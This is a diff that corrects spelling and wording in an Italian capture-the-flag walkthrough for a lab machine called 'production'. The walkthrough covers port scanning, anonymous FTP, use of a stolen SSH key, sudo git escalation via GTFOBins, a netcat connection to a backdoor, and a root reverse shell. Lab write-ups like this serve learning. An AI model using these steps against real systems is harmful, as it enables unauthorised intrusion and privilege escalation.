@@ -1,6 +1,6 @@
 # PRODUCTION
 
-### enum
+### ENUM
 facciamo uno scan delle porte
 ```bash
 nmap production.thm -sV -sC 
@@ -13,7 +13,7 @@ troviamo un ftp con accesso anonimo vediamo cosa c'è dentro
 ```bash
 ftp Anonymous@production.thm
 ```
-ottimo abbiamo una fleg e delle credenziali ssh per ashu
+ottimo abbiamo una flag e delle credenziali ssh per ashu
 
 prendiamo l'id_rsa
 
@@ -21,7 +21,7 @@ prendiamo l'id_rsa
 get id_rsa
 ```
 
-ovviamente diamogli i permessi giusti 
+diamogli i permessi giusti 
 
 ```bash
 chmod 600 id_rsa
@@ -33,7 +33,7 @@ colleghiamoci in ssh
 ssh -i id_rsa ashu@10.10.224.175
 ```
 
-ottimo facciamo privesc
+facciamo privesc
 
 ## privesc
 
@@ -52,7 +52,7 @@ abbiamo trovato una directory che si chiama homework. entriamoci!
 
 abbiamo un file python, leggiamo cosa c'è scritto
 
-ottimo c'è un password per un backdoor sulla porta 9001 a quanto pare 
+c'è un password per un backdoor sulla porta 9001 a quanto pare 
 
 vediamo skidy cosa può eseguire come sudo
 
@@ -60,7 +60,7 @@ vediamo skidy cosa può eseguire come sudo
 sudo -l
 ```
 
-possiamo eseguire il comendo git come sudo(andate a guardare su gtfo.bins) 
+possiamo eseguire il comando git come sudo(andate a guardare su gtfo.bins) 
 
 
 ora pensiamo alla backdoor
@@ -74,7 +74,7 @@ nc 10.10.224.175 9001
 
 usiamo la password trovata nel file python di prima
 
-bene siamo dentro 
+siamo dentro!
 
 usiamo un reverse shell per la porta 9002
 ```bash
@@ -94,7 +94,7 @@ sul primo terminale qundi quello avviato sulla porta 9002 mandiamo il comando
 ```bash
 /tmp/./a
 ```
-questo comando avvierà una reverse shell con privilegi di root sul votro terminale su cui vie eravati messi in ascolto
+questo comando avvierà una reverse shell con privilegi di root sul vostro terminale su cui vi eravati messi in ascolto
 
 
 
